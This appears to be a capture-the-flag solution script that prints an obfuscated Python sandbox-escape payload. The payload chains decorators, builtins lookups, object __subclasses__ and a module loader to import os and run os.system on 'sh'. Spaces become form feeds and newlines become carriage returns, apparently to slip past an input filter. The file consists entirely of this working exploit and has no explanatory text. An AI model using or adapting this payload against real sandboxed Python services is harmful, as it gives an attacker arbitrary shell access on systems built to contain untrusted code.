#!/usr/bin/env python3.8

import sys


payload = '''
__build_class__:[]
for b in[__builtins__]:[]
for m in __annotations__:[]
for b[m]in[b.get]:[]
for o in[m.__class__.__base__]:[]
for b[o.__class__.__name__]in[o]:[]
@o.__class__.__subclasses__
@b.get
class type:[]
@type.__getitem__
@m.__class__.__sizeof__
class offset_xxxxxxxxxxxxxxxxxxxxxxxxxxxx:[]
@offset_xxxxxxxxxxxxxxxxxxxxxxxxxxxx.load_module
class os:[]
@os.system
class sh:[]
'''

result = payload.strip().replace(' ', '\x0c').replace('\n', '\r')

print(f'len(result) == {len(result)}', file=sys.stderr)
print(result)
